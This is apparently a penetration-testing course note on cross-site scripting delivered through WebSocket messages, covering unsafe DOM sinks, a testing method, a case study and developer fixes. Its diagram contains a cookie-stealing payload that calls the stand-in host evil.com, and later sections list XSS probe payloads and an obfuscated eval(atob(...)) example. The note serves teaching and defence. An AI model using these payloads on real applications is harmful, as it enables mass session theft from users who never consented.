---
tags: [vapt, websockets, xss, critical, deepdive]
difficulty: intermediate
module: "29 - WebSockets Security"
topic: "29.05 WebSocket XSS"
---

# 29.05 — WebSocket XSS (Cross-Site Scripting)

## 1. Introduction: The Broadcast Threat
**WebSocket XSS** is a highly lethal variation of Stored Cross-Site Scripting. It occurs when an application receives untrusted data via a WebSocket message and subsequently renders that data into the Document Object Model (DOM) of the browser without proper contextual sanitization or output encoding.

What makes WebSocket XSS exponentially more dangerous than traditional HTTP-based XSS is the **delivery mechanism and speed**. 

In a traditional Stored XSS attack (e.g., a malicious comment on a blog post), the payload sits inert in the database. A victim must explicitly navigate to the specific blog post, make an HTTP request, and download the infected HTML for the payload to execute. It requires victim interaction and time.

WebSockets, however, are specifically designed for real-time, push-based communication (e.g., live chat rooms, trading dashboards, collaborative document editing). When an attacker injects an XSS payload over a WebSocket, the backend server acts as a massive amplifier. The server instantly broadcasts the payload over the active, persistent TCP connections to hundreds or thousands of connected users simultaneously. The frontend Javascript receives the payload and immediately renders it, causing the XSS to execute on every connected victim's browser within milliseconds, requiring absolutely zero user interaction.

## 2. The Vulnerable Architecture
The vulnerability almost always lies in how the frontend Javascript framework handles the incoming JSON payload from the `onmessage` event handler.

When a message arrives, the browser fires an event. The developer must write code to extract the text from the event and append it to the screen. If the developer uses dangerous DOM sinks (functions that interpret strings as executable HTML) instead of safe text sinks, the application is vulnerable.

**Dangerous Sinks (DO NOT USE):**
- Vanilla JS: `element.innerHTML = message;`
- Vanilla JS: `document.write(message);`
- jQuery: `$("#chat").append(message);` or `$("#chat").html(message);`
- Vue.js: `<div v-html="message"></div>`
- React: `<div dangerouslySetInnerHTML={{__html: message}} />`

**Safe Sinks (USE THESE):**
- Vanilla JS: `element.innerText = message;` or `element.textContent = message;`
- jQuery: `$("#chat").text(message);`
- React: `<div>{message}</div>` (React auto-escapes text variables by default)

## 3. Extensive ASCII Diagram: The Mass Exploitation Event
```text
================================================================================
                    THE WEBSOCKET XSS BROADCAST EVENT
================================================================================

[ The Attacker's Actions ]
Attacker identifies a live "Global Chat" feature using WebSockets.
Attacker intercepts their own outgoing message in Burp Suite.
Attacker modifies the JSON payload.

    [ OUTBOUND WEBSOCKET FRAME ]
    {
       "channel": "global",
       "user": "Hacker1",
       "message": "<img src=x onerror=\"fetch('https://evil.com?c='+document.cookie)\">"
    }

[ The Backend Server (The Amplifier) ]
The Node.js server receives the frame.
Server logic: "Broadcast this message to all 5,000 users in the 'global' channel."
The server loops through all open TCP sockets and pushes the raw JSON frame.

[ The Mass Infection ]
5,000 browsers receive the frame simultaneously via the `ws.onmessage` event.

  /--> Browser 1 (Admin User)  : executes payload -> steals admin session token
 /---> Browser 2 (Regular User): executes payload -> steals user session token
+----> Browser 3 (Regular User): executes payload -> steals user session token
 \---> Browser 4 (Regular User): executes payload -> steals user session token
  \--> Browser 5,000 (User)    : executes payload -> steals user session token

[ The Flawed Frontend Code Execution ]
Every browser runs the following vulnerable code:
`let chatBox = document.getElementById("chat_log");`
`chatBox.innerHTML += "<b>" + event.data.user + ":</b> " + event.data.message;`

Because `innerHTML` is used, the browser parses the `<img>` tag, fails to load 
the source `x`, triggers the `onerror` handler, and executes the malicious 
Javascript, sending 5,000 cookies to `evil.com` instantly.
================================================================================
```

## 4. Methodological Discovery and Exploitation

**Step 1: Identifying the Target**
- Look for any application feature that updates the screen in real-time without the page refreshing (e.g., chat boxes, live notifications, live comment feeds, collaborative whiteboards).
- Open Burp Suite `Proxy -> WebSockets history` to confirm the data is flowing via WebSockets.

**Step 2: Basic HTML Injection Testing**
- Intercept an outgoing message using Burp Repeater (as detailed in [[04 - WebSocket Message Manipulation]]).
- Inject a harmless HTML probe to test for basic DOM injection:
  `{"message": "Hello <u>Underlined</u> and <h1>Massive Header</h1>"}`
- Forward the frame. Observe your own browser. Did the text render as an actual `<h1>` header, or did the literal string `<h1>Massive Header</h1>` appear on the screen?
  - If it rendered as a header, the frontend is using a dangerous sink (like `innerHTML`). You have confirmed HTML injection, meaning XSS is highly likely.
  - If it rendered as literal text, the frontend is using a safe sink (like `textContent`). The application is secure against standard injection in this specific field.

**Step 3: Active XSS Payload Delivery**
- Once HTML injection is confirmed, escalate to a Javascript execution payload.
- Because the data is being injected into the DOM dynamically, `<script>alert(1)</script>` often will *not* execute (browsers sometimes prevent dynamically appended script tags from running).
- Therefore, always use event-handler payloads (like `onload` or `onerror`):
  - Image Payload: `<img src=x onerror=alert(document.domain)>`
  - SVG Payload: `<svg/onload=alert('XSS')>`
  - Body Payload: `<body onload=alert(1)>` (if the injection point is outside a constrained div).

**Step 4: Confirming the Broadcast (Crucial Step)**
- It is vital to confirm that the payload affects *other* users, not just your own browser (Self-XSS).
- Open a second browser profile (e.g., Firefox Private Browsing).
- Log into the application with a completely different test account.
- Keep the second browser window visible on your screen.
- Go back to your attacker browser (or Burp Repeater) and send the active XSS payload.
- If the alert box pops up on the *second* browser window instantly, you have successfully executed a broadcast Stored XSS attack.

## 5. Real-World Case Study
A critical vulnerability was discovered in a major cryptocurrency trading platform. The platform featured a "Live Trollbox" (a public chat room where traders discussed coins). 

The chat relied on WebSockets for real-time updates. The backend developers implemented a basic filter that stripped `<script>` tags, but they failed to strip HTML event handlers or SVG tags.

A malicious actor intercepted a chat message and injected a highly obfuscated payload using an SVG element: `<svg onload=eval(atob("...base64_payload..."))>`. 

Because it was a live chat room, the backend server instantly broadcast the SVG payload to the active WebSocket connections of over 20,000 online traders. 

The payload executed instantly in 20,000 browsers. The malicious Javascript was designed to silently initiate a cryptocurrency withdrawal request in the background using the victims' active, authenticated sessions. The attack was devastatingly effective due to the instantaneous, synchronous nature of the WebSocket broadcast.

## 6. How to Fix It (Developer Remediation)

Preventing WebSocket XSS requires strict adherence to output encoding principles. Defense in depth is required.

**1. Primary Defense: Safe Frontend Sinks (The Client's Responsibility)**
The ultimate responsibility for preventing XSS lies in the frontend code that renders the DOM. Developers must ensure that data received from a `ws.onmessage` event is *never* treated as executable HTML.
- **Vanilla Javascript:** Only use `element.textContent = data;` or `element.innerText = data;`. Never use `element.innerHTML`.
- **Modern Frameworks:** React, Angular, and Vue.js automatically HTML-encode text variables by default. Ensure developers are not explicitly bypassing these protections (e.g., using `v-html` or `dangerouslySetInnerHTML`).

**2. Secondary Defense: Backend Sanitization (The Server's Responsibility)**
Do not rely entirely on the frontend. The backend server should aggressively sanitize all string inputs arriving over the WebSocket before saving them to the database or broadcasting them to other users.
- Use a robust HTML sanitization library (like `DOMPurify` if parsing on the backend, or a server-side equivalent like Java's `OWASP Java HTML Sanitizer`).
- Alternatively, perform strict HTML entity encoding on the server side, converting `<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`, and `'` to `&#x27;`.

**3. Tertiary Defense: Content-Security-Policy (CSP)**
Implement a strict `Content-Security-Policy` HTTP header on the page hosting the WebSocket connection. A strong CSP (e.g., `default-src 'self'; script-src 'self'`) will prevent the browser from executing inline Javascript (like `onerror=alert(1)`), serving as a crucial safety net even if a dangerous sink is accidentally used.

## Related Notes
- [[01 - Stored XSS Basics]]
- [[04 - Blind XSS]]
- [[04 - WebSocket Message Manipulation]]
